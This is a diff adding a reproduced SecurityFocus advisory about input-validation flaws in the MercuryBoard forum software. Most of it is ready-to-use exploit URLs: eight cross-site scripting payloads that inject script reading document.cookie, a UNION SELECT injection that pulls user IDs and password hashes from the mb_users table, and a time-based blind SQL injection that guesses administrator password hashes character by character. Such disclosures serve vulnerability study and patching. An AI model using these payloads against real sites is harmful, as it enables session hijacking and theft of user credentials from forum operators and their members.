@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/12359/info
+
+Multiple input validation vulnerabilities affect MercuryBoard. These issues are due to a failure of the application to properly sanitize user-supplied input prior to using it in critical functionality.
+
+An attacker may leverage these issues to execute arbitrary code in the browser of an unsuspecting user and manipulate SQL queries against the underlying database. This may facilitate the theft of authentication credentials, destruction of data, and other attacks. 
+
+http://www.example.com/index.php?a=pm&s='><script>alert(document.cookie)</script>
+http://www.example.com/index.php?a=members&l='><script>alert(document.cookie)</script>
+http://www.example.com/index.php?a='><script>alert(document.cookie)</script>
+http://www.example.com/index.php?a=post&s='><script>alert(document.cookie)</script>
+http://www.example.com/index.php?a=post&s=reply&t='><script>alert(document.cookie)</script>
+http://www.example.com/index.php?a=pm&s=send&to='><script>alert(document.cookie)</script>
+http://www.example.com/index.php?a=pm&s=send&to=2&re='><script>alert(document.cookie)</script>
+http://www.example.com/index.php?a=cp&s='><script>alert(document.cookie)</script>
+
+To leverage the SQL injection vulnerability:
+http://www.example.com/index.php?a=post&s=reply&t=0%20UNION%20SELECT%20user_id,%20user_password%20FROM%20mb_users%20/*
+
+http://www.example.com/mercuryboard/index.php?a=post&s=reply&t=1%20UNION%20SELECT%20IF(SUBSTRING(user_password,1,1)%20=%20CHAR(53),BENCHMARK(1000000,MD5(CHAR(1))),null),null,null,null,null%20FROM%20mb_users%20WHERE%20user_group%20=%201/*
+
+
